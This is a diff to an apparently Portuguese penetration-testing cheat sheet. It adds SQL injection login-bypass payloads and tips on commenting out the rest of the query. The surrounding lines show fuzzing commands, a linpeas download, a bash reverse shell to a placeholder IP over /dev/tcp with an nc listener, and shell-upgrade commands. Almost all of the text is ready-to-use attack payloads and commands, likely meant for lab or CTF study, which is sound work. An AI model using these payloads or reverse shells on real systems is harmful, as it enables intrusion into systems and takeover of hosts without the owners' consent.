@@ -14,6 +14,28 @@ gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-m
 ffuf -w wordlist.txt -u http://DOMINIO -H "Host: FUZZ.DOMINIO"
 ```
 
+## SQL Injection básica
+
+```text
+admin' #
+admin'#
+' OR '1'='1
+" OR "1"="1
+admin'-- -
+admin'/*
+```
+
+```sql
+SELECT * FROM users WHERE username='$username' AND password='$password'
+```
+
+## Dicas SQLi de login
+
+- Tente fechar a aspa antes do comentário.
+- Use `#`, `-- -` ou `/*` para comentar o resto da query.
+- Se o backend usar aspas duplas, teste variações com `"`.
+- Se o login permitir, comece com `admin` e vá ajustando o comentário.
+
 ## SMB / FTP
 
 ```bash
@@ -45,8 +67,6 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 ```bash
 bash -i >& /dev/tcp/SEU_IP/4444 0>&1
 nc -lvnp 4444
-
-# Upgrade shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo; fg
 ```
